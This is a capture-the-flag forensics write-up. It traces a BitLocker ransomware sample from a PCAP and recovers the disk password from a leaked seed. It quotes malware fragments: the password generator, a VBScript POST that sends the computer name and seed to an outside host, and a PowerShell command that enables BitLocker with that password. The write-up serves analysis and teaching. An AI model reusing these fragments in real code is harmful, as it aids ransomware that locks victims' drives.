# Writeup
Looking at the PCAP, we see two interesting HTTP packets. The IP address 192.168.77.167 was seen downloading a file named _gpedit.zip_ and later uploading data to `/updatelog` on the IP address 192.168.77.136

Looking at `/updatedlog` we can see the text.
```http
POST /updatelog HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Language: fr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Content-Length: 40
Host: 192.168.77.136

upgrade=REVTS1RPUC01OUMxQzNECTQzOTA2Ljgz
```
Quick base64 decode later we get:

```http
upgrade=DESKTOP-59C1C3D	43906.83
```
Ok, that looks like a computername and a random number, not sure what that does yet, maybe the _gpedit.zip_ file can help us find out what that is.
We use the `File -> Export Objects -> HTTP` in Wireshark to extract _gpedit.zip_ from the PCAP and from the zip file we get a file called _gpedit.msc_.

Opening it up in VSCode, we see that it's just one massive XML file. Scrolling through, we spot a part where it's using `xls.loadXML` to load an XML-formatted string. The string looks like its url encoded, so we run it through URL decode in CyberChef, and voilà! We get the entire readable code.

- [Readable_gpedit.txt](Readable_gpedit.txt)

Examining the script, we observe that it generates a seed from various system properties, including used and free memory, total and free space, performance metrics, and network data. This seed is then utilized to generate a 64-character string using a random selection from a predefined set of characters.
```vbs
Dim strRandom
characters = "THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG!@#$&*-+=_;0123456789thequickbrownfoxjumpsoverthlazydog"
Dim seed
seed = CStr(usedMemory) & CStr(usedSpaceTotal) & CStr(freeSpaceTotal) & CStr(freeMemory)  & CStr(sys) & CStr(perf) & CStr(received) & CStr(sent) & CStr(Timer)
Rnd(-1)
Randomize seed
For i = 1 To 64
    randomNum = Int(Len(characters) * Rnd(2))
    randomChar = Mid(characters, randomNum + 1, 1)    
    strRandom = strRandom & randomChar
Next
```

Here we can see the `"computerName" Tab "seed"` is send to 192.168.77.136 in a file called `/updatelog`, lucky us, we got the `/updatelog` data from the computer that got "ransomwared" from the pcap.
```vbs
Set httpRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
httpRequest.Open "POST", "http://192.168.77.136/updatelog", False
httpRequest.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
httpRequest.SetRequestHeader "accept-language", "fr"
httpRequest.SetRequestHeader "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
httpRequest.Option(4) = 13056
httpRequest.Option(6) = true

computerName = CreateObject("WScript.Network").ComputerName
postDataPlaintext = computerName & vbTab & seed
postDataPlaintext2 = computerName & vbTab & result
```
Upon further inspection, we see that the script uses `strRandom` as the BitLocker password, formatted as "'strRandom'" (Chr(34) = " ,Chr(39) = '). The script uses a PowerShell command to convert strRandom into a secure string using `ConvertTo-SecureString` and then applies it as a password to enable BitLocker on the drives.

```vbs
If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command $a=ConvertTo-SecureString " & Chr(34)  & Chr(39) & strRandom & Chr(39)  & Chr(34) & " -asplaintext -force;Enable-BitLocker " & drives(i) & " -s -qe -pwp -pw $a")).stdout.readall) > 0 Then: End If
```
After analyzing the script and understanding how it works, we are pretty sure that the value `43906.83` found in the `/updatelog` within the PCAP file is likely the seed used to set the BitLocker password on the disk. By knowing this exact seed, we can modify the `strRandom` function from the original script and replace the seed with `43906.83`, that should yield the same password used by the ransomware.
```vbs
Dim strRandom
characters = "THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG!@#$&*-+=_;0123456789thequickbrownfoxjumpsoverthlazydog"
Dim seed
seed = 43906.83 ' Replace the seed with the one in the PCAP.
Rnd(-1)
Randomize seed
For i = 1 To 64
    randomNum = Int(Len(characters) * Rnd(2))
    randomChar = Mid(characters, randomNum + 1, 1)
    strRandom = strRandom & randomChar
Next

WScript.Echo strRandom ' prints out strRandom in a msgbox
```
voila, we get out the password:

![password](password.png)

`_tfeTIO$*Vy##f@GyRfDEJvRvNerHHDrE=GHr0CRFgSX3VYD4koa-LUU&OTDe;rb`

Now we only need to mount the disk and enter the password

![mount](mount.png)

![flag](flag.png)

and there is the flag 
`EPT{it_works_the_machine_works!}`
